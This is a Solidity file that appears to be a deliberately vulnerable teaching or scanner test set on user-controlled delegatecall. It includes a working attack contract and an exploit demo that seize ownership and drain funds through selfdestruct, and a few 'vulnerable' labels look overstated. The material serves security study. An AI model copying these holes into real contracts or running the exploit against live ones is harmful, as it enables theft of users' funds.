// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title UserControlledDelegatecall
 * @notice VULNERABLE: User-controlled delegatecall targets
 * @dev This contract demonstrates the critical vulnerability of allowing users to control
 *      the target address of delegatecall operations.
 *
 * Vulnerability: CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)
 * Severity: CRITICAL
 * Impact: Complete contract takeover, fund theft, state corruption
 *
 * Delegatecall allows arbitrary code execution in the context of the calling contract.
 * If users can control the target address, they can:
 * 1. Execute malicious code with full access to contract storage
 * 2. Steal all funds via selfdestruct
 * 3. Modify critical state variables (owner, balances, etc.)
 * 4. Bypass all access controls
 *
 * Real-world impact:
 * - Parity Wallet (2017): $280M+ frozen due to delegatecall to user-controlled library
 * - Multiple DeFi hacks using similar patterns
 * - Common in vulnerable proxy implementations
 *
 * Attack scenario:
 * 1. Attacker deploys malicious contract with selfdestruct or state-modifying code
 * 2. Attacker calls vulnerable function with their contract address
 * 3. Delegatecall executes attacker's code in victim's context
 * 4. Attacker steals funds or takes over contract
 */

/**
 * @notice VULNERABLE: Direct user-controlled delegatecall
 */
contract DirectUserControlled {
    address public owner;
    mapping(address => uint256) public balances;

    constructor() {
        owner = msg.sender;
    }

    /**
     * @notice CRITICAL VULNERABILITY: User can specify any address for delegatecall
     * @dev This allows complete contract takeover
     */
    function execute(address target, bytes calldata data) external payable {
        // VULNERABLE: User controls the target address!
        (bool success, ) = target.delegatecall(data);
        require(success, "Delegatecall failed");
    }

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * @notice VULNERABLE: Delegatecall via function parameter
 */
contract ParameterControlled {
    address public owner;
    uint256 public totalSupply;

    constructor() {
        owner = msg.sender;
        totalSupply = 1000000;
    }

    /**
     * @notice VULNERABLE: Library address as parameter
     */
    function executeLibrary(address lib, bytes memory data) external returns (bytes memory) {
        // VULNERABLE: User controls library address
        (bool success, bytes memory result) = lib.delegatecall(data);
        require(success, "Library call failed");
        return result;
    }
}

/**
 * @notice VULNERABLE: Delegatecall in loop with user-controlled addresses
 */
contract BatchDelegatecall {
    address public owner;
    mapping(address => bool) public trusted;

    constructor() {
        owner = msg.sender;
    }

    /**
     * @notice VULNERABLE: Batch execution with user-controlled targets
     */
    function batchExecute(address[] calldata targets, bytes[] calldata data) external {
        require(targets.length == data.length, "Length mismatch");

        for (uint256 i = 0; i < targets.length; i++) {
            // VULNERABLE: Each target is user-controlled
            (bool success, ) = targets[i].delegatecall(data[i]);
            require(success, "Batch call failed");
        }
    }
}

/**
 * @notice VULNERABLE: Delegatecall with weak validation
 */
contract WeakValidation {
    address public owner;
    mapping(address => uint256) public balances;

    constructor() {
        owner = msg.sender;
    }

    /**
     * @notice VULNERABLE: Weak address validation (non-zero check is insufficient)
     */
    function executeWithCheck(address target, bytes calldata data) external {
        // INSUFFICIENT: Only checks for zero address
        require(target != address(0), "Invalid address");

        // Still vulnerable - user controls target!
        (bool success, ) = target.delegatecall(data);
        require(success, "Call failed");
    }
}

/**
 * @notice VULNERABLE: Delegatecall via mapping with user input
 */
contract MappingBased {
    address public owner;
    mapping(string => address) public libraries;

    constructor() {
        owner = msg.sender;
    }

    /**
     * @notice Set library address (only owner)
     */
    function setLibrary(string memory name, address lib) external {
        require(msg.sender == owner, "Only owner");
        libraries[name] = lib;
    }

    /**
     * @notice VULNERABLE: User controls library name, which selects address
     */
    function callLibrary(string memory name, bytes memory data) external {
        address lib = libraries[name];
        require(lib != address(0), "Library not found");

        // VULNERABLE: User controls 'name', thus controls 'lib'
        (bool success, ) = lib.delegatecall(data);
        require(success, "Library call failed");
    }
}

/**
 * @notice ATTACK CONTRACT - Demonstrates exploitation
 */
contract MaliciousDelegate {
    address public owner;  // Matches storage layout of victim
    mapping(address => uint256) public balances;

    /**
     * @notice Attack function 1: Steal ownership
     */
    function takeOwnership() external {
        // This modifies slot 0 in victim's storage!
        owner = msg.sender;
    }

    /**
     * @notice Attack function 2: Drain funds
     */
    function drain() external {
        // Selfdestruct sends all of victim's ETH to attacker
        selfdestruct(payable(msg.sender));
    }

    /**
     * @notice Attack function 3: Modify critical state
     */
    function corruptState() external {
        // Corrupt victim's storage
        owner = address(0xdead);
        balances[msg.sender] = type(uint256).max;
    }
}

/**
 * @notice ATTACK DEMONSTRATION
 */
contract AttackDemo {
    /**
     * @notice Demonstrate complete contract takeover
     */
    function exploit(address victim) external {
        DirectUserControlled target = DirectUserControlled(payable(victim));

        // Deploy malicious contract
        MaliciousDelegate malicious = new MaliciousDelegate();

        // Call victim with malicious target
        bytes memory data = abi.encodeWithSignature("takeOwnership()");
        target.execute(address(malicious), data);

        // Verify ownership takeover
        assert(target.owner() == address(this));

        // Now drain all funds
        data = abi.encodeWithSignature("drain()");
        target.execute(address(malicious), data);

        // Victim is now empty and owned by attacker
    }
}

/**
 * @notice VULNERABLE: Proxy-like pattern with user control
 */
contract VulnerableProxyPattern {
    address public implementation;

    /**
     * @notice VULNERABLE: User can change implementation
     */
    function setImplementation(address newImpl) external {
        implementation = newImpl;  // No access control!
    }

    /**
     * @notice VULNERABLE: Fallback delegates to user-controlled implementation
     */
    fallback() external payable {
        address impl = implementation;
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}

/**
 * @notice VULNERABLE: Delegatecall in modifier with user input
 */
contract ModifierBased {
    address public validator;

    /**
     * @notice VULNERABLE: User-controlled validation address
     */
    modifier validate(address validatorAddr, bytes memory data) {
        (bool success, bytes memory result) = validatorAddr.delegatecall(data);
        require(success && abi.decode(result, (bool)), "Validation failed");
        _;
    }

    function executeWithValidation(address validator_, bytes memory validationData, bytes memory action)
        external
        validate(validator_, validationData)
    {
        // Even if business logic is safe, the modifier is vulnerable
    }
}

/**
 * @notice VULNERABLE: Conditional delegatecall with user influence
 */
contract ConditionalDelegatecall {
    address public owner;
    address public defaultLib;

    constructor(address lib) {
        owner = msg.sender;
        defaultLib = lib;
    }

    /**
     * @notice VULNERABLE: User can override library address
     */
    function execute(bytes memory data, address customLib) external {
        address target = customLib != address(0) ? customLib : defaultLib;

        // VULNERABLE: User can provide customLib to bypass default
        (bool success, ) = target.delegatecall(data);
        require(success, "Execution failed");
    }
}

/**
 * @notice VULNERABLE: Storage-based target selection
 */
contract StorageBasedSelection {
    address public owner;
    address[] public approvedLibraries;

    constructor() {
        owner = msg.sender;
    }

    function addLibrary(address lib) external {
        require(msg.sender == owner, "Only owner");
        approvedLibraries.push(lib);
    }

    /**
     * @notice VULNERABLE: User controls index, thus controls target
     */
    function executeLibraryByIndex(uint256 index, bytes memory data) external {
        require(index < approvedLibraries.length, "Invalid index");

        // VULNERABLE: User-controlled index selects the target
        address target = approvedLibraries[index];
        (bool success, ) = target.delegatecall(data);
        require(success, "Call failed");
    }
}
